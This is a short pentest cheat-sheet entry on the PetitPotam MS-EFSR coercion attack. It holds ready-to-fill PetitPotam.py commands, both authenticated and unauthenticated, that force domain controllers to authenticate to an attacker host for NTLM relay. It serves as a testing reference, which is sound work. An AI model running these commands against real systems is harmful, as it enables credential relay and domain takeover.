---
technique: MS-EFSR Abuse (PetitPotam)
category: mitm
targets: Domain Controllers, Domain-Joined Machines
protocols: SMB, RPC
remote_capable: true
tags: mitm coercion ms-efsr petitpotam rpc smb ntlm-relay cve-2021-36942
---

# MS-EFSR Abuse (PetitPotam)

MS-EFSR (Encrypting File System Remote protocol) exposes RPC methods that accept remote UNC paths. Calling methods such as `EfsRpcOpenFileRaw` on a target forces its machine account to authenticate to an attacker-controlled host. Null session exploitation is possible in some configurations, making this coercible without any credentials.

## Windows

No native Windows tooling is commonly used for this attack; see the Linux section.

## Linux

PetitPotam implements the vulnerable MS-EFSR methods and can coerce authentication with or without credentials.

### PetitPotam (authenticated)

#python #coercion #password

Coerce authentication from the target over SMB using valid domain credentials.

```sh title:"Coerce MS-EFSR authentication with credentials via PetitPotam"
Petitpotam.py -d "$domain" -u "$user" -p "$pass" "$lhost" "$rhost"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var rhost
-->

### PetitPotam (unauthenticated)

#python #coercion #null-session

Coerce authentication from the target without credentials using a null session (works against unpatched Windows Server 2016/2019 DCs).

```sh title:"Coerce MS-EFSR authentication without credentials via PetitPotam"
Petitpotam.py "$lhost" "$rhost"
```
<!-- cheat
import domain_ip
import tun_ip
var rhost
-->

### PetitPotam (alternate methods)

#python #coercion #unpatched

Coerce authentication using additional unpatched MS-EFSR methods not covered by the original PoC.

```sh title:"Coerce authentication via alternate MS-EFSR method"
petitpotam.py -method AddUsersToFile "$rhost" '\\'"$lhost"'\share\foo'
```
<!-- cheat
import domain_ip
import tun_ip
var rhost
-->
